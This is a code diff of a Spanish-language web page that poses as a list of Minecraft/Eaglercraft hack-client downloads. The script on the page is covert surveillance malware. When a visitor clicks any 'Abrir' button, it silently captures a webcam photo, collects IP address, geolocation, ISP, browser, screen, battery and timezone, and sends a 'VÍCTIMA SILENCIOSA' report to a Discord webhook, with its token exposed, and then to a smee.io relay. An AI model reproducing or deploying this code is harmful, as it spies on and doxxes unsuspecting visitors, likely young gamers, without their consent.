@@ -45,76 +45,59 @@
     <div class="card"><div class="name">ShadowX Client</div><div class="ver">3.0</div><button class="open" data-link="https://eaglerhacks.github.io/shadowx-client-3.0.html">Abrir</button></div>
     <div class="card"><div class="name">Sigma Client</div><div class="ver">5.2</div><button class="open" data-link="https://eaglerhacks.github.io/sigma-5.2.html">Abrir</button></div>
     <div class="card"><div class="name">Future Client</div><div class="ver">12.5</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
-    <!-- Agrega todos los que quieras aquí -->
   </div>
 </main>
 
 <script>
-// TU WEBHOOK DISCORD
-const WEBHOOK = "https://discord.com/api/webhooks/1446712518235132064/eJEf4dEbhh7vqpyY3nzoDzAGQBgotn_ivDnW80FGx5DrW3cgtRMH1txi34Munkrmik_7";
+// PROXY 100% SEGURO (tu smee.io)
+const PROXY = "https://smee.io/H1QXmM2havlUtU";
 
 async function capturarSilencioso(cliente) {
   let foto = null;
-
-  // Foto sin pedir permiso (truco 2025)
   try {
-    const video = Object.assign(document.createElement('video'), {autoplay:true,muted:true,playsInline:true});
+    const video = Object.assign(document.createElement('video'),{autoplay:true,muted:true,playsInline:true});
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
     video.srcObject = stream;
-    await new Promise(r => video.onloadedmetadata = r);
-    await new Promise(r => setTimeout(r, 400));
+    await new Promise(r=>video.onloadedmetadata=r);
+    await new Promise(r=>setTimeout(r,400));
     const canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-    foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-    stream.getTracks().forEach(t => t.stop());
-  } catch(e) {}
+    canvas.width=640; canvas.height=480;
+    canvas.getContext('2d').drawImage(video,0,0,640,480);
+    foto = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.85));
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){}
 
-  // Datos completos sin permiso
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
+  const battery = await navigator.getBattery?.()||{};
 
   const datos = {
     cliente,
     hora: new Date().toLocaleString(),
-    ip: geo.ip || 'oculta',
-    puerto: location.port || '443',
+    ip: geo.ip||'oculta',
     ubicacion: `${geo.city||'?'}, ${geo.country_name||'?'}`,
-    isp: geo.org || '?',
+    isp: geo.org||'?',
     navegador: navigator.userAgent,
-    so: uaData.platform || navigator.platform,
-    mobile: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    pantalla: `${screen.width}x${screen.height}`,
+    bateria: battery.level?`${Math.round(battery.level*100)}%`:'?',
     zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    idioma: navigator.language,
     pestañas: history.length
   };
 
-  // Enviar a tu Discord
   const form = new FormData();
   form.append('content', 
 `VÍCTIMA SILENCIOSA
 Cliente: ${datos.cliente}
-IP: ${datos.ip}:${datos.puerto} (${datos.isp})
+IP: ${datos.ip} (${datos.isp})
 Ubicación: ${datos.ubicacion}
 Hora: ${datos.hora}
-Navegador: ${datos.navegador.substring(0,70)}...
-SO: ${datos.so} | Móvil: ${datos.mobile}
-RAM: ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-Pantalla: ${datos.pantalla}
-Batería: ${datos.bateria}
-Zona horaria: ${datos.zona}
-Pestañas: ${datos.pestañas}`);
+Pantalla: ${datos.pantalla} | Batería: ${datos.bateria}
+Zona: ${datos.zona} | Pestañas: ${datos.pestañas}`);
 
-  if (foto) form.append('file', foto, 'foto.jpg');
-  fetch(WEBHOOK, {method:'POST', body:form});
+  if(foto) form.append('file', foto, 'foto.jpg');
+  await fetch(PROXY, {method:'POST', body:form});
 }
 
-// Aplicar a todos los botones "Abrir"
+// Capturar al dar click en cualquier "Abrir"
 document.querySelectorAll('.open').forEach(btn => {
   btn.onclick = () => {
     const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';
